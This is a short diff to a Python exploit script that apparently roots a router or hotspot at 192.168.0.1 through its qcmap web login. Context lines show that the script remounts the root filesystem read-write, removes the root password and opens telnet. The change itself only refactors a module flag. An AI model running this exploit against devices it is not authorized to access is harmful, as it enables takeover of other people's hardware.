@@ -19,7 +19,9 @@ import urllib.parse
 import requests
 import time
 from getpass import getpass
-from utils import TelnetConnection,chooseAction,chPwdFlag,args;
+
+import utils
+from utils import TelnetConnection,chooseAction,args;
 
 # We have to get an authentication token for the exploit to work, provided by the
 # qcmap_auth cgi. The login page AES128-ECB encrypts the weblogin
@@ -116,7 +118,7 @@ print(f'\nConnected! Socket says: {exploit.json()}\n')
 print('Remounted root filesystem r/w. . .')
 print('Removed root password. . .')
 print('Enabling telnet. . .')
-chPwdFlag = True # i.e. there is no root password set
+utils.chPwdFlag = True
 
 # start telnet and prompt user for action, see details of implementation in utils.py
 tn = TelnetConnection('192.168.0.1', 5)
